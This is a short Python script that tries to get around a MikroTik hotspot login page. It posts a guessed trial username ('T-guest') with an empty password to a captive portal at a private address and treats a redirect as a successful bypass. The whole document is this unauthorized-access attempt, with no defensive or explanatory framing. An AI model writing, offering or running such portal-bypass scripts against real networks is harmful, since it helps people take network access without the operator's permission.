import requests

url = "http://192.168.48.1/login"
# Common MikroTik trial parameters
data = {
    "dst": "http://www.google.com",
    "username": "T-guest", # Try common trial usernames
    "password": ""
}

print("Attempting 'Hidden Trial' bypass...")
r = requests.post(url, data=data, allow_redirects=False)

if r.status_code == 302:
    print(f"Success? Redirected to: {r.headers.get('Location')}")
else:
    print("Trial bypass failed. Admin likely disabled the default 'guest' account.")

